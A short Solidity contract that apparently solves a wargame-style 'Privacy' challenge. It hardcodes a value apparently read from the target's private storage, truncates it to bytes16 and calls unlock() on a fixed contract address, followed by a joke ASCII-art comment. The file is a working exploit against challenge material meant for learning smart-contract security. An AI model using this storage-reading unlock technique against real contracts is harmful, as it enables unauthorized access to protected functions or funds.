// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Privacy.sol';
contract PrivacyHack {

    Privacy priv = Privacy(address(0x1b2cED28e28B822cCD5aF2e686B33ce2fBABf8F4));
  bytes32[3] private data = [bytes32(0x0), bytes32(0x0), bytes32(0x2543463c02b071ec6526d204cb8b55089de794d1a644eb4254de094441e1b8ae)];


  
  function answer() public {
    bytes16 answer =  bytes16(data[2]);
    priv.unlock(answer);
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}